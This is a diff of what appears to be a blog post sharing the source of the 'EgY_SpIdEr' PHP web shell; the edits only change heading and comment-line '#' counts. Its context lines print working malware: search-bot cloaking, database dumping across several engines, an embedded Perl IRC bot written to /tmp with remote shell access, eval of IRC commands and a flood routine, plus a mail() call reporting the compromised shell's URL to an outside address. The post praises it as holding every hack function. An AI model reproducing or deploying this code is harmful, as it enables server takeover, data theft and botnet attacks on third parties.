@@ -15,7 +15,7 @@ EgY_SpIdEr ShElL. developer (Developed?) by EgY SpIdEr.
 
 This shell seems to have every hack function you might want on a single page! Take a look at the screenshot below.
 
-## EgY_SpIdEr ShElL Source Code
+### EgY_SpIdEr ShElL Source Code
 
 <pre class="brush: php; title: ; notranslate" title="">&lt;?php if (preg_match("/bot/", $_SERVER[HTTP_USER_AGENT])) {
     header("HTTP/1.0 404");
@@ -626,19 +626,19 @@ class my_sql {
                     function dump($table) {
                         if (empty($table)) return 0;
                         $this-&gt;dump = array();
-                        $this-&gt;dump[0] = '##';
-                        $this-&gt;dump[1] = '## --------------------------------------- ';
-                        $this-&gt;dump[2] = '##  Created: ' . date("d/m/Y H:i:s");
-                        $this-&gt;dump[3] = '## Database: ' . $this-&gt;base;
-                        $this-&gt;dump[4] = '##    Table: ' . $table;
-                        $this-&gt;dump[5] = '## --------------------------------------- ';
+                        $this-&gt;dump[0] = '###';
+                        $this-&gt;dump[1] = '### --------------------------------------- ';
+                        $this-&gt;dump[2] = '###  Created: ' . date("d/m/Y H:i:s");
+                        $this-&gt;dump[3] = '### Database: ' . $this-&gt;base;
+                        $this-&gt;dump[4] = '###    Table: ' . $table;
+                        $this-&gt;dump[5] = '### --------------------------------------- ';
                         switch ($this-&gt;db) {
                             case 'MySQL':
-                                $this-&gt;dump[0] = '## MySQL dump';
+                                $this-&gt;dump[0] = '### MySQL dump';
                                 if ($this-&gt;query('/*' . chr(0) . '*/ SHOW CREATE TABLE `' . $table . '`') != 1) return 0;
                                 if (!$this-&gt;get_result()) return 0;
                                 $this-&gt;dump[] = $this-&gt;rows[0]['Create Table'];
-                                $this-&gt;dump[] = '## --------------------------------------- ';
+                                $this-&gt;dump[] = '### --------------------------------------- ';
                                 if ($this-&gt;query('/*' . chr(0) . '*/ SELECT * FROM `' . $table . '`') != 1) return 0;
                                 if (!$this-&gt;get_result()) return 0;
                                 for ($i = 0;$i &lt; $this-&gt;num_rows;$i++) {
@@ -649,7 +649,7 @@ class my_sql {
                                 }
                                 break;
                             case 'MSSQL':
-                                $this-&gt;dump[0] = '## MSSQL dump';
+                                $this-&gt;dump[0] = '### MSSQL dump';
                                 if ($this-&gt;query('SELECT * FROM ' . $table) != 1) return 0;
                                 if (!$this-&gt;get_result()) return 0;
                                 for ($i = 0;$i &lt; $this-&gt;num_rows;$i++) {
@@ -660,7 +660,7 @@ class my_sql {
                                 }
                                 break;
                             case 'PostgreSQL':
-                                $this-&gt;dump[0] = '## PostgreSQL dump';
+                                $this-&gt;dump[0] = '### PostgreSQL dump';
                                 if ($this-&gt;query('SELECT * FROM ' . $table) != 1) return 0;
                                 if (!$this-&gt;get_result()) return 0;
                                 for ($i = 0;$i &lt; $this-&gt;num_rows;$i++) {
@@ -671,7 +671,7 @@ class my_sql {
                                 }
                                 break;
                             case 'Oracle':
-                                $this-&gt;dump[0] = '## ORACLE dump';
+                                $this-&gt;dump[0] = '### ORACLE dump';
                                 if ($this-&gt;query('SELECT * FROM ' . $table) != 1) return 0;
                                 if (!$this-&gt;get_result()) return 0;
                                 for ($i = 0;$i &lt; $this-&gt;num_rows;$i++) {
@@ -682,7 +682,7 @@ class my_sql {
                                 }
                                 break;
                             case 'MySQLi':
-                                $this-&gt;dump[0] = '## MySQLi dump';
+                                $this-&gt;dump[0] = '### MySQLi dump';
                                 if ($this-&gt;query('SELECT * FROM ' . $table) != 1) return 0;
                                 if (!$this-&gt;get_result()) return 0;
                                 for ($i = 0;$i &lt; $this-&gt;num_rows;$i++) {
@@ -693,7 +693,7 @@ class my_sql {
                                 }
                                 break;
                             case 'mSQL':
-                                $this-&gt;dump[0] = '## mSQL dump';
+                                $this-&gt;dump[0] = '### mSQL dump';
                                 if ($this-&gt;query('SELECT * FROM ' . $table) != 1) return 0;
                                 if (!$this-&gt;get_result()) return 0;
                                 for ($i = 0;$i &lt; $this-&gt;num_rows;$i++) {
@@ -704,7 +704,7 @@ class my_sql {
                                 }
                                 break;
                             case 'SQLite':
-                                $this-&gt;dump[0] = '## SQLite dump';
+                                $this-&gt;dump[0] = '### SQLite dump';
                                 if ($this-&gt;query('SELECT * FROM ' . $table) != 1) return 0;
                                 if (!$this-&gt;get_result()) return 0;
                                 for ($i = 0;$i &lt; $this-&gt;num_rows;$i++) {
@@ -2177,31 +2177,31 @@ gQUZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90b2NvbCkgb3IgZGllICJzb2NrZXQoKSA6ICQhIjsKY29
                     echo "Now Connecting to &lt;b&gt;&lt;font color=\"red\"&gt;$ircserver&lt;/font&gt;&lt;/b&gt; in &lt;b&gt;&lt;font color=\"yellow\"&gt;$ircchan&lt;/font&gt;&lt;/b&gt; Andministrators: &lt;b&gt;&lt;font color=\"yellow\"&gt;$ircadmin&lt;/font&gt;&lt;/b&gt; Botname is &lt;b&gt;&lt;font color=\"yellow\"&gt;$irclabel&lt;/font&gt;&lt;/b&gt;";
                     echo "&lt;p&gt;Dont Forget to Delete Loader.pl in /tmp&lt;/p&gt;";
                     $file = "
-################ CONFIGURACAO #################################################################
+######################## CONFIGURACAO #################################################################################################
 my \$processo = '/usr/local/apache/bin/httpd -DSSL'; # Nome do processo que vai aparece no ps #
-#----------------------------------------------################################################
+#----------------------------------------------########################################################################
 my \$linas_max='48'; # Evita o flood <img src="{{ site.baseurl }}/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" /> depois de X linhas #
-#----------------------------------------------################################################
+#----------------------------------------------########################################################################
 my \$sleep='4'; # ele dorme X segundos #
-##################### IRC #####################################################################
+############################### IRC #######################################################################################################
 my @adms=(\"$ircadmin\"); # Nick do administrador #
-#----------------------------------------------################################################
+#----------------------------------------------########################################################################
 my @canais=(\"$ircchan\"); # Caso haja senha (\"#canal :senha\") #
-#----------------------------------------------################################################
+#----------------------------------------------########################################################################
 my \$nick='$irclabel'; # Nick do bot. Caso esteja em uso vai aparecer #
                                                # aparecer com numero radonamico no final #
-#----------------------------------------------################################################
+#----------------------------------------------########################################################################
 my \$ircname = 'Linux'; # User ID #
-#----------------------------------------------################################################
+#----------------------------------------------########################################################################
 chop (my \$realname = `uname -a`); # Full Name #
-#----------------------------------------------################################################
+#----------------------------------------------########################################################################
 \$servidor='$ircserver' unless \$servidor; # Servidor de irc que vai ser usado #
                                                # caso n?o seja especificado no argumento #
-#----------------------------------------------################################################
+#----------------------------------------------########################################################################
 my \$porta='6667'; # Porta do servidor de irc #
-################ ACESSO A SHELL ###############################################################
+######################## ACESSO A SHELL ##############################################################################################
 my \$secv = 1; # 1/0 pra habilita/desabilita acesso a shell #
-###############################################################################################
+##############################################################################################################################################
 my \$VERSAO = '0.2';
 \$SIG{'INT'} = 'IGNORE';
 \$SIG{'HUP'} = 'IGNORE';
@@ -2219,9 +2219,9 @@ my \$pid=fork;
 exit if \$pid;
 die \"Problema com o fork: $!\" unless defined(\$pid);
 my \$dcc_sel = new IO::Select-&gt;new();
-#############################
+###########################################
 # B0tchZ na veia ehehe <img src="{{ site.baseurl }}/wp-includes/images/smilies/icon_razz.gif" alt=":P" class="wp-smiley" /> #
-#############################
+###########################################
 
 \$sel_cliente = IO::Select-&gt;new();
 sub sendraw {
@@ -2232,7 +2232,7 @@ sub sendraw {
       print \$IRC_cur_socket \"\$_[0]\\n\";
   }
 }
-#################################
+#################################################
 sub conectar {
    my \$meunick = \$_[0];
    my \$servidor_con = \$_[1];
@@ -2253,7 +2253,7 @@ sub conectar {
      sendraw(\"USER \$ircname \".\$IRC_socket-&gt;sockhost.\" \$servidor_con :\$realname\");
      sleep 1;
    }
-} #####################
+} ###############################
 
 my \$line_temp;
 while( 1 ) {
@@ -2295,7 +2295,7 @@ while( 1 ) {
    }
 }
 
-#########################
+#####################################
 
 
 sub parse {
@@ -2341,7 +2341,7 @@ sub parse {
        }
    }
 }
-##########################
+#######################################
 
 sub bfunc {
   my \$printl = \$_[0];
@@ -2391,7 +2391,7 @@ sub bfunc {
        }
   }
 }
-##########################
+#######################################
 
 
 sub ircase {
@@ -2471,7 +2471,7 @@ sub ircase {
      eval \"$1\";
    }
 }
-##########################
+#######################################
 
 sub shell {
   return unless \$secv;
@@ -2542,9 +2542,9 @@ sub attacker {
   return(\$cur_time, %pacotes);
 }
 
-#############
+###################
 # ALIASES #
-#############
+###################
 
 sub action {
    return unless $#_ == 1;
@@ -2652,7 +2652,7 @@ sub quit {
 }
 
 # DCC
-#########################
+#####################################
 
 package DCC;
 
@@ -2738,7 +2738,7 @@ sub connections {
      }
    }
 }
-##########################
+#######################################
 
 sub SEND {
   my (\$nick, \$arquivo) = @_;
@@ -2798,7 +2798,7 @@ sub GET {
   \$DCC{\$dccsock}{porta} = \$dccporta;
   \$DCC{\$dccsock}{status} = \"Recebendo\";
 }
-############################
+##########################################
 # po fico xato de organiza o status.. dai fiz ele retorna o status de acordo com o socket.. dai o ADM.pl lista os sockets e faz as perguntas
 sub Status {
   my \$socket = shift;
@@ -2850,7 +2850,7 @@ sub fixaddr {
         return;
     }
 }
-############################
+##########################################
 ";
                     $bot = "/tmp/ircs.pl";
                     $open = fopen($bot, "w");
@@ -5067,7 +5067,7 @@ mail("xw0lfx.707@gmail.com
 ", "Shell http://$web$inj", "$body");
 </pre>
 
-## Egy Spider shell screenshot<figure id="attachment_430" style="width: 477px;" class="wp-caption aligncenter">
+### Egy Spider shell screenshot<figure id="attachment_430" style="width: 477px;" class="wp-caption aligncenter">
 
 [<img src="{{ site.baseurl }}/wp-content/uploads/2014/02/egy-spider_shell-477x1024.png" alt="Egy Spider shell screenshot" width="477" height="1024" class="size-large wp-image-430" />][1]<figcaption class="wp-caption-text">Egy Spider shell screenshot</figcaption></figure>
 
